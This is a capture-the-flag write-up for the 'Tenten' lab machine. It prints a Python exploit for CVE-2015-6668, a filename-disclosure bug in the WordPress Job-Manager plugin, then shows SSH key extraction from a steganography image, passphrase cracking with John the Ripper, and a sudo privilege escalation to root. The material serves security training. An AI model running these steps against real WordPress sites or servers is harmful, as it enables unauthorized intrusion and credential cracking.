# Tenten
## Exploiting WordPress Job-Manager Vulnerability

After scanning the wordpress site for vulnerabilities, you will come a cross a vulnerability for the Job-Manager. It allows us to read through the victims file system and through this way we are able to retrieve a steganography image that gives us a RSA private key which can be bruteforced with John the Ripper to expose the private key password. And thus gaining access to the system.

Job-Manager Exploit:
```python
import requests

print """
CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: <=0.7.25
"""
website = "http://10.10.10.10/"
filename = "HackerAccessGranted"

filename2 = filename.replace(" ", "-")

for year in range(2016,2020):
    print(year)
    for i in range(1,13):
        for extension in {'jpg','jpeg','png'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```
> Run that with python and you will gain access to the steganograph file.

After getting the image file, you can decode it online for example here: https://futureboy.us/stegano/decinput.html

*Poof you have a private key*
Get yourself john the ripper bundle and do some magic like this.
```
ssh2john id_rsa > id_rsa.hash
```
> After that you have the hash of that private key which can then be bruteforced to reveal the password

```
john id_rsa.hash --wordlist=rockyou.txt
```
*Bow, you have the password*
```
ssh -i id_rsa takis@10.10.10.10
> Enter the password
```

> Now that you are in, lets find a way out into the root account

```
sudo -l

Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: >> /bin/fuckin  <<

sudo /bin/fuckin bash
```
*Congratulations, you are root!*
